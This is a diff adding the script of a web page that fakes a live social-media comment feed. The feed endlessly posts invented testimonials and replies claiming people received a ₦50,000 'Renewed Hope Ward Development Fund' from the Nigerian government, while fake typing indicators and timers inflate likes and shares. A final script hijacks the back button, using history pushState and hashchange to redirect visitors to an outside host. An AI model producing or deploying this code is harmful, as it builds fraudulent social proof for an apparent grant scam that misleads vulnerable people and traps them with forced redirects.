+        "Fatima Usman", "Ibrahim Musa", "Blessing Eze", "David Ojo",
+        "Blessing Johnson", "Abdul Sani", "Esther Okon", "Samuel Adewale",
+        "Ngozi Obi", "Tunde Adebayo", "Zainab Garba", "Precious Sunday",
+        "Oluwatosin Akin", "Chioma Eze", "Kelechi Obi", "Adeola Ogun"
+      ];
+
+      const COLORS = ["#F87171", "#FBBF24", "#34D399", "#60A5FA", "#A78BFA", "#F472B6", "#38BDF8", "#FB923C", "#4ADE80",
+        "#C084FC", "#F97316", "#2DD4BF"
+      ];
+
+      const TOP_COMMENTS = [
+        "I just received my ₦50,000 Renewed Hope Ward Development Fund! This is real. Thank you Mr. President!",
+        "Finally something for the masses. Renewed Hope Ward Development Fund is a game changer. Got mine!",
+        "Omo see alert! Renewed Hope fund is paying ooo. I just claimed my ₦50,000.",
+        "My brother just got his alert. Renewed Hope Ward Development Fund is real. Share and claim yours.",
+        "I can't believe I got ₦50,000 from the Federal Government! God bless Renewed Hope 🙏",
+        "This is historic! Renewed Hope is truly for the people. I got my ₦50,000.",
+        "Renewed Hope Ward Development Fund is real! I just confirmed mine. Share with others.",
+        "Thank you Mr. President for remembering the common man. I received my ₦50,000!",
+        "No capital needed and I got my ₦50,000. This is unbelievable. Thank you Renewed Hope!",
+        "Just claimed my ₦50,000. Renewed Hope Ward Development Program is the best thing this year!",
+        "I never thought I could get government money easily. Renewed Hope made it possible. God bless!",
+        "My friend received his alert this morning. I'm next in line. Renewed Hope for life!",
+        "This is what we call dividends of democracy. Renewed Hope Ward Development Fund!",
+        "Finally, a government that remembers the poor. I got my ₦50,000! Thank you Renewed Hope.",
+        "Renewed Hope Ward Development Program is the real deal. I just received my alert!",
+        "Who else is claiming their ₦50,000 today? This is amazing! 🔥"
+      ];
+
+      const REPLIES = [
+        "Congratulations! I just got mine too. 🎉",
+        "Yes, it's available for all Nigerians. No capital needed.",
+        "I received my ₦50,000 after verification. Renewed Hope is a blessing!",
+        "Same here! Wishing everyone good luck 🙏",
+        "I got my alert yesterday. This is real!",
+        "I hope I get my ₦50,000 too 🤞",
+        "Thanks for confirming. I'm applying now.",
+        "I just shared to my WhatsApp groups too!",
+        "Renewed Hope Ward Development Fund is real. Confirmed!",
+        "This is one of the best things to happen to Nigerians this year.",
+        "Can't wait to receive my ₦50,000. Good luck everyone! 🔥",
+        "My brother just got his alert. Renewed Hope for life!",
+        "This is historic. ₦50,000 from the Federal Government!",
+        "I received mine this morning. Thank you Mr. President!",
+        "No capital, no problem. Renewed Hope made it possible. 🙌"
+      ];
+
+      const COMMENT_IMAGE_SLOTS = [
+        "renewed1.png", "renewed2.png", "renewed3.png",
+        "renewed4.png", "renewed5.png", "renewed6.png"
+      ];
+
+      const commentsEl = document.getElementById('flcComments');
+      const commentCountEl = document.getElementById('flcCommentCount');
+      const typingStatusEl = document.getElementById('flcTypingStatus');
+      let commentCount = 23000;
+      let commentStore = [];
+      let idSeq = 1;
+
+      function pick(arr) {
+        return arr[Math.floor(Math.random() * arr.length)];
+      }
+
+      function initials(name) {
+        return name.split(' ').map(w => w[0]).slice(0, 2).join('').toUpperCase();
+      }
+
+      function colorFor(name) {
+        let h = 0;
+        for (let i = 0; i < name.length; i++) h = name.charCodeAt(i) + ((h << 5) - h);
+        return COLORS[Math.abs(h) % COLORS.length];
+      }
+
+      function slug(name) {
+        return name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/(^-|-$)/g, '');
+      }
+
+      const PHOTO_ICON_SVG =
+        '<svg viewBox="0 0 24 24" width="26" height="26" style="fill:#7a6e5a;"><path d="M21 19V5a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>';
+
+      function buildAvatar(container, name, imgPath, size) {
+        container.innerHTML = '';
+        container.style.width = size + 'px';
+        container.style.height = size + 'px';
+        const fallback = document.createElement('div');
+        fallback.style.cssText =
+          `position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:${Math.round(size*0.38)}px;background:${colorFor(name)};`;
+        fallback.textContent = initials(name);
+        const img = document.createElement('img');
+        img.style.cssText = 'position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:none;';
+        img.alt = name;
+        img.src = imgPath;
+        img.onload = () => { img.style.display = 'block'; };
+        img.onerror = () => { img.style.display = 'none'; };
+        container.appendChild(fallback);
+        container.appendChild(img);
+      }
+
+      function createAvatarEl(name, size) {
+        const wrap = document.createElement('div');
+        wrap.style.cssText =
+          `position:relative;width:${size}px;height:${size}px;border-radius:50%;flex-shrink:0;overflow:hidden;background:#e4e6eb;`;
+        const path = (name === 'You' && userProfilePic) ? userProfilePic : `images/avatar-${slug(name)}.png`;
+        buildAvatar(wrap, name, path, size);
+        return wrap;
+      }
+
+      let userProfilePic = null;
+      const youAvatarEl = document.getElementById('flcYouAvatar');
+      buildAvatar(youAvatarEl, 'You', 'images/you.jpg', 32);
+      const editBadge = document.createElement('div');
+      editBadge.style.cssText =
+        'position:absolute;bottom:-2px;right:-2px;width:16px;height:16px;border-radius:50%;background:#1a871c;border:2px solid #fff;display:flex;align-items:center;justify-content:center;pointer-events:none;';
+      editBadge.innerHTML =
+        '<svg viewBox="0 0 24 24" width="8" height="8" style="fill:#fff;"><path d="M9 3l-1.8 2H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V7a2 2 0 00-2-2h-3.2L15 3H9zm3 15a5 5 0 110-10 5 5 0 010 10z"/></svg>';
+      youAvatarEl.appendChild(editBadge);
+      const profilePicInput = document.getElementById('flcProfilePicInput');
+      youAvatarEl.addEventListener('click', () => profilePicInput.click());
+      profilePicInput.addEventListener('change', () => {
+        const file = profilePicInput.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+          userProfilePic = e.target.result;
+          buildAvatar(youAvatarEl, 'You', userProfilePic, 32);
+          youAvatarEl.appendChild(editBadge);
+        };
+        reader.readAsDataURL(file);
+      });
+
+      function createCommentImage(path) {
+        const wrap = document.createElement('div');
+        wrap.className = 'flc-comment-image';
+        wrap.style.cssText =
+          'margin-top:6px;border-radius:12px;overflow:hidden;max-width:min(260px,100%);border:1px solid #d0d1d5;';
+        const img = document.createElement('img');
+        img.style.cssText = 'display:block;width:100%;max-height:220px;object-fit:cover;';
+        img.alt = 'Comment image';
+        img.loading = 'lazy';
+        img.src = path;
+        img.onload = () => { wrap.style.background = ''; };
+        img.onerror = () => {
+          wrap.style.cssText =
+            'margin-top:6px;border-radius:12px;overflow:hidden;max-width:min(260px,100%);border:1px solid #d0d1d5;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;padding:22px 12px;';
+          wrap.innerHTML = PHOTO_ICON_SVG +
+            `<span style="font-size:11px;color:#7a6e5a;text-align:center;word-break:break-all;">${path}</span>`;
+        };
+        wrap.appendChild(img);
+        return wrap;
+      }
+
+      function createCommentImageFromDataUrl(dataUrl) {
+        const wrap = document.createElement('div');
+        wrap.className = 'flc-comment-image';
+        wrap.style.cssText =
+          'margin-top:6px;border-radius:12px;overflow:hidden;max-width:min(260px,100%);border:1px solid #d0d1d5;';
+        const img = document.createElement('img');
+        img.style.cssText = 'display:block;width:100%;max-height:220px;object-fit:cover;';
+        img.alt = 'Attached image';
+        img.src = dataUrl;
+        wrap.appendChild(img);
+        return wrap;
+      }
+
+      function isNearTop() {
+        return commentsEl.scrollTop < 80;
+      }
+
+      function scrollToTop() {
+        commentsEl.scrollTop = 0;
+      }
+
+      function bumpCount() {
+        commentCount++;
+        commentCountEl.textContent = commentCount.toLocaleString();
+      }
+
+      function likeBurst(wrapEl) {
+        const heart = document.createElement('span');
+        heart.style.cssText =
+          'position:absolute;left:2px;top:-4px;pointer-events:none;font-size:14px;animation:flcHeartUp .7s ease forwards;';
+        heart.textContent = '❤️';
+        wrapEl.appendChild(heart);
+        setTimeout(() => heart.remove(), 700);
+      }
+
+      function makeActions(isReply, likeSeed) {
+        const wrap = document.createElement('div');
+        wrap.className = 'flc-actions';
+        wrap.style.cssText =
+          'display:inline-flex;flex-wrap:nowrap;white-space:nowrap;gap:8px;align-items:center;margin:0 2px 0 10px;font-size:12.5px;color:#606770;max-width:100%;';
+        let liked = false;
+        let count = likeSeed;
+        const likeWrap = document.createElement('span');
+        likeWrap.style.cssText = 'position:relative;display:inline-flex;';
+        const likeBtn = document.createElement('button');
+        likeBtn.type = 'button';
+        likeBtn.textContent = 'Like';
+        likeBtn.style.cssText =
+          'background:none;border:none;padding:4px 2px;margin:-4px -2px;font-size:12.5px;font-weight:600;color:#606770;cursor:pointer;font-family:inherit;';
+        likeWrap.appendChild(likeBtn);
+        likeBtn.addEventListener('click', () => {
+          liked = !liked;
+          count += liked ? 1 : -1;
+          likeBtn.style.color = liked ? '#F33E58' : '#606770';
+          countSpan.textContent = count > 0 ? count : '';
+          if (liked) likeBurst(likeWrap);
+        });
+        const countSpan = document.createElement('span');
+        countSpan.style.cssText = 'font-weight:400;color:#606770;';
+        countSpan.textContent = count > 0 ? count : '';
+        const replyBtn = document.createElement('button');
+        replyBtn.type = 'button';
+        replyBtn.textContent = 'Reply';
+        replyBtn.style.cssText =
+          'background:none;border:none;padding:4px 2px;margin:-4px -2px;font-size:12.5px;font-weight:600;color:#606770;cursor:pointer;font-family:inherit;';
+        const dotStyle = 'opacity:.6;';
+        const dot1 = document.createElement('span');
+        dot1.style.cssText = dotStyle;
+        dot1.textContent = '·';
+        const time = document.createElement('span');
+        time.textContent = 'Just now';
+        wrap.appendChild(likeWrap);
+        wrap.appendChild(countSpan);
+        if (!isReply) {
+          wrap.appendChild(dot1);
+          wrap.appendChild(replyBtn);
+        }
+        const dot2 = document.createElement('span');
+        dot2.style.cssText = dotStyle;
+        dot2.textContent = '·';
+        wrap.appendChild(dot2);
+        wrap.appendChild(time);
+        return { wrap, replyBtn };
+      }
+
+      function createCommentRow(name, text, isReply, imagePathOrDataUrl, isDataUrl) {
+        const row = document.createElement('div');
+        row.className = isReply ? 'flc-comment-row flc-reply-row' : 'flc-comment-row';
+        row.style.cssText =
+          `display:flex;gap:8px;margin:10px 0;animation:flcPop .32s cubic-bezier(.2,.9,.3,1.3);`;
+        const avatar = createAvatarEl(name, isReply ? 28 : 34);
+        const col = document.createElement('div');
+        col.className = 'flc-bubble-col';
+        col.style.cssText = 'flex:1;min-width:0;';
+        const bubble = document.createElement('div');
+        bubble.style.cssText =
+          'background:#f0f2f5;border-radius:16px;padding:8px 12px 6px;display:inline-block;max-width:100%;box-sizing:border-box;border:1px solid #e1e2e3;';
+        const nameEl = document.createElement('span');
+        nameEl.style.cssText = 'font-weight:600;font-size:13.5px;display:block;margin-bottom:1px;color:#1c1e21;';
+        nameEl.textContent = name;
+        const textEl = document.createElement('span');
+        textEl.style.cssText = 'font-size:14.5px;line-height:1.35;color:#1c1e21;word-wrap:break-word;overflow-wrap:anywhere;';
+        textEl.textContent = text;
+        bubble.appendChild(nameEl);
+        bubble.appendChild(textEl);
+        const likeSeed = isReply ? Math.floor(Math.random() * 6) : Math.floor(Math.random() * 30);
+        const { wrap: actions, replyBtn } = makeActions(isReply, likeSeed);
+        col.appendChild(bubble);
+        if (imagePathOrDataUrl) {
+          const imgEl = isDataUrl ? createCommentImageFromDataUrl(imagePathOrDataUrl) : createCommentImage(
+            imagePathOrDataUrl);
+          col.appendChild(imgEl);
+        }
+        col.appendChild(actions);
+        let repliesEl = null;
+        let replyComposerShown = false;
+        if (!isReply) {
+          repliesEl = document.createElement('div');
+          repliesEl.className = 'flc-replies';
+          repliesEl.style.cssText =
+            'margin-left:clamp(8px,4vw,16px);padding-left:clamp(6px,3vw,14px);border-left:2px solid #e1e2e3;margin-top:6px;display:none;';
+          col.appendChild(repliesEl);
+          replyBtn.addEventListener('click', () => {
+            if (replyComposerShown) {
+              const existing = col.querySelector('.flc-reply-composer');
+              if (existing) existing.remove();
+              replyComposerShown = false;
+              return;
+            }
+            replyComposerShown = true;
+            repliesEl.style.display = 'block';
+            const rc = document.createElement('div');
+            rc.className = 'flc-reply-composer';
+            rc.style.cssText = 'margin:6px 0 0 12px;display:flex;gap:8px;';
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.placeholder = `Reply to ${name}…`;
+            input.maxLength = 150;
+            input.style.cssText =
+              'flex:1;min-width:0;border:none;background:#f0f2f5;border-radius:16px;padding:6px 12px;font-size:16px;font-family:inherit;outline:none;box-sizing:border-box;color:#1c1e21;';
+            const send = document.createElement('button');
+            send.type = 'button';
+            send.textContent = 'Post';
+            send.style.cssText =
+              'border:none;background:none;color:#1a871c;font-weight:700;font-size:13px;cursor:pointer;font-family:inherit;padding:4px 6px;';
+            rc.appendChild(input);
+            rc.appendChild(send);
+            col.insertBefore(rc, repliesEl);
+            input.focus();
+
+            function submitReply() {
+              const val = input.value.trim();
+              if (!val) return;
+              const r = createCommentRow('You', val, true);
+              repliesEl.appendChild(r.row);
+              repliesEl.style.display = 'block';
+              bumpCount();
+              rc.remove();
+              replyComposerShown = false;
+            }
+            send.addEventListener('click', submitReply);
+            input.addEventListener('keydown', e => {
+              if (e.key === 'Enter') submitReply();
+            });
+          });
+        }
+        row.appendChild(avatar);
+        row.appendChild(col);
+        return { row, repliesEl };
+      }
+
+      function maybeCommentImagePath() {
+        return Math.random() < 0.28 ? pick(COMMENT_IMAGE_SLOTS) : null;
+      }
+
+      function appendTopLevel(name, text, imagePath) {
+        const { row, repliesEl } = createCommentRow(name, text, false, imagePath, false);
+        commentsEl.prepend(row);
+        bumpCount();
+        const id = idSeq++;
+        commentStore.unshift({ id, repliesEl });
+        if (commentStore.length > 40) commentStore.pop();
+        if (isNearTop()) scrollToTop();
+        return id;
+      }
+
+      function appendReply(repliesEl, name, text, imagePath, isDataUrl) {
+        repliesEl.style.display = 'block';
+        const { row } = createCommentRow(name, text, true, imagePath, isDataUrl);
+        repliesEl.appendChild(row);
+        bumpCount();
+        if (isNearTop()) scrollToTop();
+      }
+
+      function showTyping(name) {
+        const row = document.createElement('div');
+        row.style.cssText = 'display:flex;gap:8px;margin:10px 0;align-items:flex-end;animation:flcPop .25s ease;';
+        const avatar = createAvatarEl(name, 34);
+        const bubble = document.createElement('div');
+        bubble.style.cssText =
+          'background:#f0f2f5;border-radius:16px;padding:10px 14px;display:inline-flex;align-items:center;gap:4px;border:1px solid #e1e2e3;';
+        [0, 1, 2].forEach(i => {
+          const dot = document.createElement('span');
+          dot.style.cssText =
+            `width:6px;height:6px;border-radius:50%;background:#8A8D91;animation:flcBounce 1.1s infinite ease-in-out;animation-delay:${i*0.15}s;display:inline-block;`;
+          bubble.appendChild(dot);
+        });
+        row.appendChild(avatar);
+        row.appendChild(bubble);
+        commentsEl.prepend(row);
+        if (isNearTop()) scrollToTop();
+        typingStatusEl.textContent = `${name} is typing…`;
+        return row;
+      }
+
+      function hideTyping(row) {
+        row.remove();
+        typingStatusEl.textContent = '';
+      }
+
+      function seedInitialComments() {
+        const seed = [
+          ["Amara Chen", pick(TOP_COMMENTS), [
+            ["Diego Ruiz", pick(REPLIES)]
+          ]],
+          ["Kwame Asante", pick(TOP_COMMENTS), []],
+          ["Lena Fischer", pick(TOP_COMMENTS), [
+            ["Sofia Rossi", pick(REPLIES)],
+            ["Yuki Tanaka", pick(REPLIES)]
+          ]],
+        ];
+        seed.slice().reverse().forEach(([name, text, replies]) => {
+          const id = appendTopLevel(name, text, maybeCommentImagePath());
+          const entry = commentStore.find(c => c.id === id);
+          replies.forEach(([rn, rt]) => appendReply(entry.repliesEl, rn, rt));
+        });
+        scrollToTop();
+      }
+
+      function simulateOne() {
+        const asReply = commentStore.length > 0 && Math.random() < 0.35;
+        const name = pick(NAMES);
+        const typingRow = showTyping(name);
+        const delay = 900 + Math.random() * 1400;
+        setTimeout(() => {
+          hideTyping(typingRow);
+          if (asReply) {
+            const topThree = commentStore.slice(0, Math.min(3, commentStore.length));
+            const target = pick(topThree);
+            appendReply(target.repliesEl, name, pick(REPLIES));
+            maybeChainReplies(target);
+          } else {
+            const text = pick(TOP_COMMENTS);
+            const id = appendTopLevel(name, text, maybeCommentImagePath());
+            const entry = commentStore.find(c => c.id === id);
+            if (Math.random() < 0.45) {
+              maybeChainReplies(entry);
+            }
+          }
+        }, delay);
+      }
+
+      function maybeChainReplies(entry) {
+        const n = 1 + Math.floor(Math.random() * 3);
+        let i = 0;
+
+        function next() {
+          if (i >= n) return;
+          i++;
+          const name = pick(NAMES);
+          const trow = showTyping(name);
+          const d = 800 + Math.random() * 1200;
+          setTimeout(() => {
+            hideTyping(trow);
+            appendReply(entry.repliesEl, name, pick(REPLIES));
+            setTimeout(next, 600 + Math.random() * 900);
+          }, d);
+        }
+        setTimeout(next, 400);
+      }
+
+      // ─── post-level like / comment / share bar ───
+      const likeTotalEl = document.getElementById('flcLikeTotal');
+      const shareCountEl = document.getElementById('flcShareCount');
+      const postLikeBtn = document.getElementById('flcPostLikeBtn');
+      const postCommentBtn = document.getElementById('flcPostCommentBtn');
+      const postShareBtn = document.getElementById('flcPostShareBtn');
+      let likeTotal = 134000;
+      let shareTotal = 12000;
+      let postLiked = false;
+
+      function renderLikeTotal() {
+        likeTotalEl.textContent = likeTotal.toLocaleString();
+      }
+
+      function renderShareTotal() {
+        shareCountEl.textContent = `${shareTotal.toLocaleString()} shares`;
+      }
+      renderLikeTotal();
+      renderShareTotal();
+
+      postLikeBtn.addEventListener('click', () => {
+        postLiked = !postLiked;
+        likeTotal += postLiked ? 1 : -1;
+        postLikeBtn.style.color = postLiked ? '#1a871c' : '#606770';
+        renderLikeTotal();
+      });
+      postCommentBtn.addEventListener('click', () => {
+        document.getElementById('flcComposerInput').focus();
+      });
+      postShareBtn.addEventListener('click', () => {
+        shareTotal += 1;
+        renderShareTotal();
+      });
+
+      setInterval(() => {
+        if (Math.random() < 0.6) {
+          likeTotal += 1;
+          renderLikeTotal();
+        }
+      }, 5000 + Math.random() * 4000);
+      setInterval(() => {
+        if (Math.random() < 0.3) {
+          shareTotal += 1;
+          renderShareTotal();
+        }
+      }, 9000 + Math.random() * 6000);
+
+      function loop() {
+        simulateOne();
+        const next = 3000 + Math.random() * 700;
+        setTimeout(loop, next);
+      }
+
+      // ─── composer + real image attach ───
+      const attachBtn = document.getElementById('flcAttachBtn');
+      const fileInput = document.getElementById('flcFileInput');
+      const attachPreview = document.getElementById('flcAttachPreview');
+      const attachImg = document.getElementById('flcAttachImg');
+      const attachRemove = document.getElementById('flcAttachRemove');
+      let pendingImageDataUrl = null;
+
+      attachBtn.addEventListener('click', () => fileInput.click());
+      fileInput.addEventListener('change', () => {
+        const file = fileInput.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = (e) => {
+          pendingImageDataUrl = e.target.result;
+          attachImg.src = pendingImageDataUrl;
+          attachPreview.style.display = 'block';
+        };
+        reader.readAsDataURL(file);
+      });
+      attachRemove.addEventListener('click', () => {
+        pendingImageDataUrl = null;
+        fileInput.value = '';
+        attachPreview.style.display = 'none';
+      });
+
+      document.getElementById('flcComposerForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const input = document.getElementById('flcComposerInput');
+        const val = input.value.trim();
+        if (!val && !pendingImageDataUrl) return;
+        const id = appendTopLevel('You', val || ' ', pendingImageDataUrl);
+        if (pendingImageDataUrl) {
+          const row = commentsEl.firstElementChild;
+          const existingImg = row.querySelector('.flc-comment-image');
+          if (existingImg) existingImg.remove();
+          row.querySelector('.flc-bubble-col').insertBefore(
+            createCommentImageFromDataUrl(pendingImageDataUrl),
+            row.querySelector('.flc-actions')
+          );
+        }
+        input.value = '';
+        pendingImageDataUrl = null;
+        fileInput.value = '';
+        attachPreview.style.display = 'none';
+        scrollToTop();
+        if (Math.random() < 0.5) {
+          const entry = commentStore.find(c => c.id === id);
+          setTimeout(() => maybeChainReplies(entry), 1500 + Math.random() * 1500);
+        }
+      });
+
+      seedInitialComments();
+      setTimeout(loop, 2000);
+    })();
+  </script>
+
+  
+  <script>
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() { fh(); }
+    setTimeout('hh();', 500);
+    function fh(){ location.href="https://otieu.com/4/10077877"; }
+    function goon(){ location.href="https://otieu.com/4/10077877"; }
+  </script>
+  
+</body>
+</html>
